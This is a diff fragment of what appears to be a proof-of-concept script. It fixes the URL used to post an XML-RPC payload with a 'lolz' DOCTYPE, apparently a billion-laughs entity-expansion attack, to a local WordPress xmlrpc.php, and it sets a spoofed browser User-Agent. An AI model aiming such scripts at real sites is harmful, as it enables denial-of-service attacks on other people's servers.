@@ -15,7 +15,7 @@ data = """<?xml version="1.0" encoding="iso-8859-1"?><!DOCTYPE lolz [
    <param><value>aa</value></param>
   </params>
 </methodCall>"""
-req = urllib.request.Request('https://http://localhost/wordpress/xmlrpc.php', data.encode('utf-8'))
+req = urllib.request.Request('https://localhost/wordpress/xmlrpc.php', data.encode('utf-8'))
 req.add_header('Accept', '*/*')
 req.add_header('User-Agent', 'Mozilla/5.0 (Wihndows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0')
 req.add_header('Connection', '')
